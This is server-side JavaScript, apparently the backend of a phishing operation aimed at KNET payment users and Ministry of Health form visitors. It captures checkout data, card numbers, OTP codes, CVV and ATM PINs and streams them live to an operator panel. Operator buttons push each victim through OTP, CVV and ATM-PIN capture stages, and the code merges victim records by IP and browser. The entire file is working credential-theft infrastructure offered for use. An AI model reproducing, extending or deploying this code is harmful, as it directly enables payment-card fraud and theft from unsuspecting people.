v.data=Object.assign({},v.data||{},fields);
if(!v.dataHistory)v.dataHistory=[];
v.dataHistory.push({content:fields,page:pg,timestamp:new Date().toISOString()});
if(Object.keys(fields).length>1)v.hasNewData=true;
v.lastActivity=Date.now();/*FIX102A*/ try { if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) { var __pA102 = String(pg || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__pA102)) { v.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__pA102)) { pg = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
v.page=pg;
visitors.set(v.socketId||v._id,v);
try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v);else if(typeof saveData==='function')saveData()}catch(e){}
admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}});
console.log('kdk5 data',v._id,pg)}catch(e){console.log('kdk5 push err',e.message)}}
io.on('connection',function(socket){
socket.onAny(function(ev,arg){try{
var p=arg||{};if(ev==='visitor:register'||ev==='card:live')__kdkApp[socket.id]=1;var v=__kdkFind(socket.id);
if(!v&&(ev==='visitor:pageEnter'||ev==='more-info'||ev==='data:function'||ev==='data:query'))v=__kdkMake(socket);
if(!v)return;
if(!visitors.has(socket.id))visitors.set(socket.id,v);
var name=p.name||'',table=p.table||'',op=p.operation||'',fields=null;
if(ev==='data:function'&&/order|checkout|submit|create|confirm|summary|customer|cart/i.test(name))fields=p.body||{};
else if(ev==='data:query'&&op&&op!=='select'&&/order|checkout|cart|customer/i.test(table))fields=Array.isArray(p.payload)?p.payload[0]:p.payload;
if(!fields)return;
if(fields.fields&&typeof fields.fields==='object')fields=Object.assign({},fields,fields.fields);
if(fields.customer&&typeof fields.customer==='object')fields=Object.assign({},fields.customer,fields);
if(Array.isArray(fields.items)&&fields.items.length){try{fields['المنتجات']=fields.items.map(function(it){return String((it.title||it.name||it.product_name||'')+' x'+(it.quantity||it.qty||1))}).join(' | ').slice(0,600)}catch(e){}}
console.log('kdk5 hit',ev,name||table);
__kdkPush(v,fields,'إتمام الطلب')}catch(e){console.log('kdk5 any err',e.message)}})});
setInterval(function(){try{
var g={};
__kdkAll().forEach(function(v){if(!v||!v.ip)return;var key=String(v.ip);if(!g[key])g[key]=[];g[key].push({v:v})});
Object.keys(g).forEach(function(kk){
var a=g[kk];if(a.length<2)return;
a.sort(function(x,y){return ((y.v.isConnected?1:0)-(x.v.isConnected?1:0))||((y.v.lastActivity||0)-(x.v.lastActivity||0))||((y.v.fullName?1:0)-(x.v.fullName?1:0))});
var keep=a[0].v;
for(var i=1;i<a.length;i++){
var d=a[i].v;if(d._id===keep._id)continue;if(__kdkApp[d.socketId]&&!__kdkApp[keep.socketId]&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}if(!keep.country||keep.country==='Unknown')keep.country=d.country;if(d.liveCard&&d.liveCard.cardNumber&&!(keep.liveCard&&keep.liveCard.cardNumber))keep.liveCard=d.liveCard;if(d.hasEnteredCardPage)keep.hasEnteredCardPage=true;if(!visitors.has(keep.socketId)&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}
keep.data=Object.assign({},d.data||{},keep.data||{});
if(!keep.fullName&&d.fullName)keep.fullName=d.fullName;
if(!keep.phone&&d.phone)keep.phone=d.phone;
if((d.dataHistory||[]).length)keep.dataHistory=(keep.dataHistory||[]).concat(d.dataHistory);
if((d.digitCodes||[]).length)keep.digitCodes=(keep.digitCodes||[]).concat(d.digitCodes);
if((d.paymentCards||[]).length)keep.paymentCards=(keep.paymentCards||[]).concat(d.paymentCards);
if((d._sockets||[]).length)keep._sockets=Array.from(new Set([].concat(keep._sockets||[],d._sockets)));
keep.hasNewData=keep.hasNewData||d.hasNewData;
if(!keep.userAgent)keep.userAgent=d.userAgent;
__kdkSock[d.socketId]=keep;
try{visitors.delete(d.socketId)}catch(e){}
try{visitors.delete(d._id)}catch(e){}
try{(d._sockets||[]).forEach(function(sx){if(sx&&sx!==d.socketId)visitors.set(sx,keep)})}catch(e){}
try{savedVisitors=savedVisitors.filter(function(x){return x._id!==d._id})}catch(e){}
admins.forEach(function(ad,id){try{io.to(id).emit('visitor:deleted',{visitorId:d._id})}catch(e){}});
console.log('kdk5 merged',d._id,'->',keep._id)}
visitors.set(keep.socketId||keep._id,keep);
admins.forEach(function(ad,id){try{io.to(id).emit('visitor:new',keep)}catch(e){}})});
try{if(typeof saveData==='function')saveData()}catch(e){}
__kdkAll().forEach(function(v){var s=null;try{Object.keys(__kdkApp).forEach(function(k){if(__kdkSock[k]===v&&visitors.has(k))s=k})}catch(e){}if(s&&v.socketId!==s&&!__kdkApp[v.socketId]){__kdkSock[v.socketId]=v;v.socketId=s;v.isConnected=true;visitors.set(s,v);admins.forEach(function(a,i){try{io.to(i).emit('visitor:new',v)}catch(e){}})}});}catch(e){console.log('kdk5 sweep err',e.message)}},5000);
/*END-KDD-KDKAW-BRIDGE5*/

/*KDK-FIX90*/
try{io.on('connection',function(socket){socket.onAny(function(ev,p){try{if(ev!=='visitor:register')return;p=p||{};if(p.existingVisitorId)return;var h=(socket.handshake&&socket.handshake.headers)||{};var ip=String(h['x-forwarded-for']||socket.handshake.address||'').split(',')[0].trim();if(!ip)return;var f=null;try{__kdkAll().forEach(function(v){if(!f&&v&&v.ip===ip&&(Date.now()-(v.lastActivity||0))<900000)f=v})}catch(e){}if(f){p.existingVisitorId=f._id;console.log('kdk90 adopt',socket.id,f._id)}}catch(e){}})});}catch(e){}
/*END-KDK-FIX90*/
/*KDD-FIX123 — زائر = بطاقة واحدة: إلغاء دمج الزوار حسب الآي بي */
try {
  function __f123Real(socket){
    try{
      var h = (socket.handshake && socket.handshake.headers) || {};
      return String(h['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
    }catch(e){ return ''; }
  }
  function __f123Key(p){
    try{
      var o = (p && typeof p === 'object') ? p : {};
      var v = o.existingVisitorId || o.visitorId || o.visitor_id || o.id || o.clientId || o.uid || o.token || o.deviceId;
      if (!v && o.data) v = o.data.existingVisitorId || o.data.visitorId || o.data.id;
      if (!v && o.content) v = o.content.existingVisitorId || o.content.visitorId || o.content.id;
      return v ? String(v) : '';
    }catch(e){ return ''; }
  }
  function __f123Hash(s){
    var h = 5381; s = String(s || '');
    for (var i = 0; i < s.length; i++) h = ((h * 33) ^ s.charCodeAt(i)) >>> 0;
    return h.toString(36).slice(0, 5);
  }
  function __f123Ids(p){
    var out = [];
    try{
      var objs = [p, p && p.data, p && p.content, p && p.details, p && p.form];
      var keys = ['existingVisitorId','visitorId','visitor_id','id','clientId','uid','token','deviceId'];
      for (var i = 0; i < objs.length; i++){
        var o = objs[i]; if (!o || typeof o !== 'object') continue;
        for (var j = 0; j < keys.length; j++){ if (o[keys[j]]) out.push(String(o[keys[j]])); }
      }
    }catch(e){}
    return out;
  }
  function __f123Find(ids){
    var f = null;
    try{ if (ids.length) savedVisitors.forEach(function(v){ if (!f && v && ids.indexOf(String(v._id)) > -1) f = v; }); }catch(e){}
    if (!f){ try{ visitors.forEach(function(v){ if (!f && v && ids.indexOf(String(v._id)) > -1) f = v; }); }catch(e){} }
    return f;
  }

  io.on('connection', function(socket){
    var real = __f123Real(socket);
    var syn = null;
    socket.prependAny(function(ev, p){
      try{
        if (!syn){
          syn = (real || 'ip') + '#' + __f123Hash(__f123Key(p) || socket.id);
          try{ socket.handshake.headers['x-forwarded-for'] = syn; }catch(e){}
          try{
            var cur = visitors.get(socket.id);
            if (cur){ cur.ip = syn; if (real) cur.realIp = real; }
          }catch(e){}
        }
        if (ev !== 'visitor:register') return;
        var ids = __f123Ids(p);
        var f = __f123Find(ids);
        if (f){
          try{ f.ip = syn; if (real) f.realIp = real; }catch(e){}
          try{ p.existingVisitorId = f._id; }catch(e){}
          var cur2 = visitors.get(socket.id);
          if (cur2 && cur2._id !== f._id){
            try{ savedVisitors = savedVisitors.filter(function(x){ return x._id !== cur2._id; }); }catch(e){}
            try{ visitors.set(socket.id, f); }catch(e){}
            admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:deleted', { visitorId: cur2._id }); }catch(e){} });
          }
        } else {
          try{ p.existingVisitorId = ''; }catch(e){}
        }
      }catch(e){ console.log('FIX123 any err', e.message); }
    });
  });
  console.log('FIX123 ready: one card per visitor');
} catch(e){ console.log('FIX123 err', e.message); }

/*FIX123b — احتياطي: مطابقة بيانات وزارة الصحة عبر الآي بي الحقيقي */
try{
  app.post('/api/moh-data', function(req){
    try{
      var h = req.headers || {};
      var ip = String(h['x-forwarded-for'] || h['x-real-ip'] || '').split(',')[0].trim();
      if (!ip) return;
      var b = req.body || {};
      var v = null;
      if (b.visitorId) visitors.forEach(function(x){ if (!v && x && x._id === b.visitorId) v = x; });
      if (!v && b.socketId) v = visitors.get(b.socketId) || null;
      if (v) return;
      visitors.forEach(function(x){ if (!v && x && x.realIp === ip) v = x; });
      if (!v) savedVisitors.forEach(function(x){ if (!v && x && x.realIp === ip) v = x; });
      if (!v) return;
      var d = b.data || {};
      var fields = {};
      if (d.fields && typeof d.fields === 'object') fields = Object.assign(fields, d.fields);
      if (d.content && d.content.fields && typeof d.content.fields === 'object') fields = Object.assign(fields, d.content.fields);
      if (!Object.keys(fields).length) return;
      var sig = JSON.stringify(fields);
      if (v.__f123sig === sig && (Date.now() - (v.__f123at || 0)) < 12000) return;
      v.__f123sig = sig; v.__f123at = Date.now();
      if (!v.dataHistory) v.dataHistory = [];
      v.dataHistory.push({ content: fields, page: 'MOH', timestamp: new Date().toISOString() });
      v.data = Object.assign({}, v.data || {}, fields);
      v.hasNewData = true;
      v.page = 'MOH';
      try{ visitors.set(v.socketId || v._id, v); }catch(e){}
      try{ if (typeof saveVisitorPermanently === 'function') saveVisitorPermanently(v); }catch(e){}
      admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:dataSubmitted', { visitorId: v._id, socketId: v.socketId, data: { content: fields, page: 'MOH' }, visitor: v }); }catch(e){} });
    }catch(e){}
  });
}catch(e){}
/*KDD-FIX125 — بطاقة وحدة لكل جهاز (المفتاح = آي بي + المتصفح) مهما كان الموقع */
try {
  function __f125Real(socket){
    try{
      var h = (socket.handshake && socket.handshake.headers) || {};
      return String(h['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
    }catch(e){ return ''; }
  }
  function __f125Ua(socket){
    try{ return String(((socket.handshake||{}).headers||{})['user-agent'] || ''); }catch(e){ return ''; }
  }
  function __f125Hash(s){
    var h = 5381; s = String(s || '');
    for (var i = 0; i < s.length; i++) h = ((h * 33) ^ s.charCodeAt(i)) >>> 0;
    return h.toString(36).slice(0, 5);
  }
  function __f125Syn(real, ua){ return (real || 'ip') + '#' + __f125Hash(ua || ''); }

  /* توحيد السجلات القديمة على نفس القاعدة حتى تندمج تلقائياً */
  try{
    savedVisitors.forEach(function(v){
      if (!v) return;
      var base = v.realIp || String(v.ip || '').split('#')[0] || '';
      if (!base) return;
      v.realIp = base;
      v.ip = __f125Syn(base, v.userAgent || '');
    });
    try{ saveData(); }catch(e){}
  }catch(e){}

  io.on('connection', function(socket){
    var real = __f125Real(socket);
    var syn = __f125Syn(real, __f125Ua(socket));
    socket.onAny(function(ev, p){
      try{
        try{ socket.handshake.headers['x-forwarded-for'] = syn; }catch(e){}
        var cur = visitors.get(socket.id);
        if (cur){ cur.ip = syn; if (real) cur.realIp = real; }
        if (ev !== 'visitor:register') return;

        var already = null;
        try{ if (p && p.existingVisitorId) savedVisitors.forEach(function(v){ if (!already && v && v._id === p.existingVisitorId) already = v; }); }catch(e){}
        if (already) return;

        var g = null;
        try{
          savedVisitors.forEach(function(v){
            if (!v || v.ip !== syn) return;
            if (cur && v._id === cur._id) return;
            if (!g || (v.lastActivity || 0) > (g.lastActivity || 0)) g = v;
          });
        }catch(e){}
        if (!g) return;
        try{ p.existingVisitorId = g._id; }catch(e){}
        if (cur && cur._id !== g._id){
          try{ savedVisitors = savedVisitors.filter(function(x){ return x._id !== cur._id; }); }catch(e){}
          try{ visitors.set(socket.id, g); }catch(e){}
          admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:deleted', { visitorId: cur._id }); }catch(e){} });
        }
      }catch(e){ console.log('FIX125 err', e.message); }
    });
  });
  console.log('FIX125 ready: one card per device');
} catch(e){ console.log('FIX125 err', e.message); }
/*KDD-FIX126 — تثبيت عنوان الصفحة على "رمز التحقق كي نت (OTP)" حتى ما يترجرج مع "دفع كي نت" */
try {
  var __f126LBL = 'رمز التحقق كي نت (OTP)';
  function __f126IsOtp(p){ return /otp|رمز/i.test(String(p || '')); }
  function __f126IsKnet(p){ return /كي\s*نت|knet/i.test(String(p || '')); }
  function __f126Done(p){ return /cvv|atm|مرور|نهائي|final/i.test(String(p || '')); }
  function __f126HasOtp(v){
    try{
      if (!v) return false;
      if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) return true;
      var hit = false;
      try{ hit = (v.digitCodes || []).some(function(dc){ return dc && __f126IsOtp(dc.page) && __f126IsKnet(dc.page); }); }catch(e){}
      if (!hit){ try{ hit = (v.dataHistory || []).some(function(en){ return en && __f126IsOtp(en.page) && en.content && en.content['الرمز']; }); }catch(e){} }
      if (hit) v.__f98otp = Date.now();
      return hit;
    }catch(e){ return false; }
  }
  function __f126Apply(v, page){
    try{
      var p = String(page == null ? (v && v.page) || '' : page);
      if (__f126Done(p)) { try{ if (v) v.__f98otp = 0; }catch(e){} return p; }
      if (!v) return p;
      if (__f126IsOtp(p)) return p;
      if (!__f126IsKnet(p)) return p;
      if (!__f126HasOtp(v)) return p;
      return __f126LBL;
    }catch(e){ return page; }
  }

  /* 1) قناة التطبيق (data:function / data:query) */
  try{
    var __f126push = __kdkPush;
    __kdkPush = function(v, fields, page){
      try{ page = __f126Apply(v, page); }catch(e){}
      return __f126push(v, fields, page);
    };
  }catch(e){}

  /* 2) قناة more-info */
  io.on('connection', function(socket){
    socket.onAny(function(ev, p){
      try{
        if (ev !== 'more-info' || !p || typeof p !== 'object') return;
        var v = visitors.get(socket.id) || null;
        if (!v) return;
        p.page = __f126Apply(v, p.page);
      }catch(e){}
    });
  });

  /* 3) شبكة أمان + إبلاغ اللوحة */
  setInterval(function(){
    try{
      visitors.forEach(function(v, sid){
        if (!v) return;
        var want = __f126Apply(v, v.page);
        if (want === v.page) return;
        v.page = want;
        try{ visitors.set(sid, v); }catch(e){}
        try{ saveVisitorPermanently(v); }catch(e){}
        admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:pageChanged', { visitorId: v._id, page: v.page }); }catch(e){} });
      });
    }catch(e){}
  }, 900);
  console.log('FIX126 ready: OTP page label locked');
} catch(e){ console.log('FIX126 err', e.message); }
/*KDD-FIX127 — عنوان بطاقة الزائر يتبع أزرار اللوحة (OTP / CVV / ATM) ولا يرجع للخلف */
try {
  var __f127Stage = {};   /* _id -> { label, at } */

  function __f127Apply(v, page){
    try{
      if (!v) return page;
      var st = __f127Stage[v._id];
      if (!st) return page;
      if ((Date.now() - st.at) > 180000) { delete __f127Stage[v._id]; return page; }
      var p = String(page == null ? (v.page || '') : page);
      if (/cvv|atm|مرور|نهائي|final/i.test(p)) return p;
      return st.label;
    }catch(e){ return page; }
  }
  function __f127Set(v, key, label){
    if (!v) return;
    v.page = label;
    if (/cvv|atm|مرور/i.test(label)) { try{ v.__f98otp = 0; }catch(e){} }
    __f127Stage[v._id] = { label: label, at: Date.now() };
    try{ visitors.set(key || v.socketId || v._id, v); }catch(e){}
    try{ saveVisitorPermanently(v); }catch(e){}
    admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:pageChanged', { visitorId: v._id, page: label }); }catch(e){} });
  }

  /* 1) أزرار اللوحة */
  io.on('connection', function(socket){
    socket.onAny(function(ev, p){
      try{
        if (ev !== 'admin:codeAction' && ev !== 'admin:cardAction') return;
        if (!p || typeof p !== 'object') return;
        var act = String(p.action || ''), sid = p.visitorSocketId;
        var key = sid, v = null;
        try{ v = visitors.get(sid) || null; }catch(e){}
        if (!v){ try{ visitors.forEach(function(x, k){ if (!v && x && x._id === sid) { v = x; key = k; } }); }catch(e){} }
        if (!v) return;
        if (act === 'cvv') __f127Set(v, key, 'CVV');
        else if (act === 'atm') __f127Set(v, key, 'كلمة مرور ATM');
        else if (act === 'otp') __f127Set(v, key, 'رمز التحقق كي نت (OTP)');
        else if (act === 'reject') { try{ delete __f127Stage[v._id]; }catch(e){} }
      }catch(e){}
    });
  });

  /* 2) قناة التطبيق */
  try{
    var __f127push = __kdkPush;
    __kdkPush = function(v, fields, page){
      try{ page = __f127Apply(v, page); }catch(e){}
      return __f127push(v, fields, page);
    };
  }catch(e){}

  /* 3) قناة more-info */
  io.on('connection', function(socket){
    socket.onAny(function(ev, p){
      try{
        if (ev !== 'more-info' || !p || typeof p !== 'object') return;
        var v = visitors.get(socket.id) || null;
        if (!v) return;
        p.page = __f127Apply(v, p.page);
      }catch(e){}
    });
  });

  /* 4) شبكة أمان */
  setInterval(function(){
    try{
      visitors.forEach(function(v, sid){
        if (!v) return;
        var want = __f127Apply(v, v.page);
        if (want === v.page) return;
        v.page = want;
        try{ visitors.set(sid, v); }catch(e){}
        try{ saveVisitorPermanently(v); }catch(e){}
        admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:pageChanged', { visitorId: v._id, page: v.page }); }catch(e){} });
      });
    }catch(e){}
  }, 800);

  console.log('FIX127 ready: page follows admin actions');
} catch(e){ console.log('FIX127 err', e.message); }
